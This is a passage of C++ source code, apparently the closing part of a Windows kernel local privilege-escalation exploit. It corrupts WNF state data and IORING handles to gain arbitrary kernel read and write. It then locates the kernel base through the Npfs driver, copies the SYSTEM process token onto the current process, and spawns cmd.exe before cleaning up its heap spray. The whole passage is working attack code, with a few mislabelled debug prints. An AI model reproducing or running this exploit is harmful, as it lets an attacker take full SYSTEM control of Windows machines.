    pNtUpdateWnfStateData(&(malWNF[0].state), buffer, 0x1000, 0, 0, 0, 0);

    Sleep(2000);

    // Step 11: Find the malicious IORING handle

    PVOID pipeAttributeFlink = *(PVOID*)((uintptr_t)pipeptr + sizeof(POOL_HEADER));
    printf("[+] Found PipeAttribute.Flink: %p\n", pipeAttributeFlink);
    PVOID fileObject_ptr = (PVOID)((uintptr_t)pipeAttributeFlink - ROOT_PIPE_ATTRIBUTE_OFFSET + FILE_OBJECT_OFFSET);
    printf("[+] Pointer to FILE_OBJECT pointer of Npfs driver: %p\n", fileObject_ptr);

    DWORD64 fileObject = 0;
    for (int i = 0; i < IORINGS_SIZE; i++) {
        targetHandle = reinterpret_cast<HIORING>(iorings[i]);
        KRead((PVOID)fileObject_ptr, reinterpret_cast<PBYTE>(&fileObject), sizeof(fileObject));
        if (fileObject != 0x4141414141414141) {
            printf("[+] Found Target IORING handle %p\n", iorings[i]->handle);
            break;
        }
    }
    printf("[+] FILE_OBJECT of Npfs driver: %llx\n", fileObject);

    // Step 12: Read kernel base address

    DWORD64 deviceObject = 0;
    DWORD64 driverObject = 0;
    DWORD64 NpFsdCreate = 0;
    DWORD64 npfs_base = 0;
    DWORD64 exallocatepool2 = 0;
    DWORD64 nt_base = 0;
    DWORD64 eprocess = 0;
    DWORD64 eprocess_systoken = 0;
    
    // Retrieve DEVICE_OBJECT
    KRead((PVOID)(fileObject + 0x8), reinterpret_cast<PBYTE>(&deviceObject), sizeof(deviceObject));
    printf("[+] DEVICE_OBJECT of Npfs driver: %llx\n", deviceObject);

    // Retrieve DRIVER_OBJECT
    KRead((PVOID)(deviceObject + 0x8), reinterpret_cast<PBYTE>(&driverObject), sizeof(driverObject));
    printf("[+] DRIVER_OBJECT of Npfs driver: %llx\n", driverObject);

    // Retrieve DRIVER_OBJECT->MajorFunction.NpFsdCreate
    KRead((PVOID)(driverObject + 0x70), reinterpret_cast<PBYTE>(&NpFsdCreate), sizeof(NpFsdCreate));
    printf("[+] Npfs!NpFsdCreate Address: %llx\n", driverObject);
    npfs_base = NpFsdCreate - NPFSDCREATE_OFFSET;
    printf("[+] Npfs Base Address: %llx\n", npfs_base);

    // Retrieve Npfs-> IAT.ExAllocatePool2
    KRead((PVOID)(npfs_base + IAT_EXALLOCATEPOOL2_OFFSET), reinterpret_cast<PBYTE>(&exallocatepool2), sizeof(exallocatepool2));
    printf("[+] nt!ExAllocatePool2 Address: %llx\n", exallocatepool2);

    // Calculate NT = nt!ExAllocatePool2 - OFFSET
    nt_base = exallocatepool2 - EXALLOCATEPOOL2_OFFSET;
    printf("[+] Kernel Base Address: %llx\n", nt_base);

    // Step 13: Token Stealing

    // Retrieve system.exe EPROCESS
    KRead((PVOID)(nt_base + EPROCESS_OFFSET), reinterpret_cast<PBYTE>(&eprocess), sizeof(eprocess));
    printf("[+] EPROCESS of system.exe: %llx\n", nt_base);

    // Retrieve EPROCESS.Token of sytsem.systen.exe
    KRead((PVOID)(eprocess + TOKEN_OFFSET), reinterpret_cast<PBYTE>(&eprocess_systoken), sizeof(eprocess_systoken));
    printf("[+] EPROCESS.Token of system.exe: %llx\n", nt_base);

    // Retrieve EPROCESS of current process
    DWORD cpid = GetCurrentProcessId();
    printf("[+] Current Process ID: 0x%lx\n", cpid);
    PVOID SysProcHead = PVOID((uintptr_t)eprocess + ACTIVEPROCESSLINKS_OFFSET);
    DWORD foundpid = 0;
    PVOID nextPid = 0;
    PVOID ppid = NULL;
    PVOID nextProc = (PVOID)eprocess;

    while (cpid != foundpid) {
        KRead((PVOID)((uintptr_t)nextProc + ACTIVEPROCESSLINKS_OFFSET), reinterpret_cast<PBYTE>(&nextProc), sizeof(nextProc));
        
        nextProc = (PVOID)((uintptr_t)nextProc - ACTIVEPROCESSLINKS_OFFSET);
        KRead((PVOID)((uintptr_t)nextProc + UNIQUEPROCESSID_OFFSET), reinterpret_cast<PBYTE>(&foundpid), sizeof(foundpid));

        if (SysProcHead == nextProc) {
            printf("[+] Failed to find target's EPROCESS\n");
            return 1;
        }
    }

    if (nextProc == NULL) {
        printf("[-] Unable to find EPROCESS of current process!\n");
        return 1;
    }

    PVOID currentEPROCESS = nextProc;
    printf("[+] Found EPROCESS address of current process: %p\n", currentEPROCESS);

    // Attempting to overwrite the stole Token to current process
    eprocess_systoken &= 0xfffffffffffffff0;
    printf("[+] Attempting to overwrite current process's Token to escalate...\n");
    KWrite(PVOID((uintptr_t)currentEPROCESS + TOKEN_OFFSET), reinterpret_cast<PBYTE>(&eprocess_systoken), sizeof(eprocess_systoken));

    system("cmd.exe");

    // Step 14: Clean up

    /// Replace the backup_buffer
    /// Replace the original kernel address of IOP_MC_BUFFER_ENTRY*
    pNtUpdateWnfStateData(&(malWNF[0].state), backup_buffer, 0x1000, 0, 0, 0, 0);

    for (int i = 0; i < IORINGS_SIZE; i++) {
        result = CloseIoRing(reinterpret_cast<HIORING>(iorings[i]));
        if (!SUCCEEDED(result)) {
            printf("[-] Failed CloseIoRing: 0x%x\n", result);
            return FALSE;
        }
    }

    for (int i = 0; i < PIPE_COUNT; i++) {
        if (!CloseHandle(pRead[i])) {
            std::cout << "CloseHandle failed with error 0x" << std::hex << result << std::endl;
        }
        if (!CloseHandle(pWrite[i])) {
            std::cout << "CloseHandle failed with error 0x" << std::hex << result << std::endl;
        }
    }

    for (int i = 0; i < SPRAY_ONE; i++) {
        pNtDeleteWnfStateName(&(spray1[i]));
    }

    for (int i = 0; i < SPRAY_TWO; i++) {
        pNtDeleteWnfStateName(&(spray2[i]));
    }

    for (int i = 0; i < SPRAY_THREE; i++) {
        pNtDeleteWnfStateName(&(spray3[i]));
    }

    return 0;
}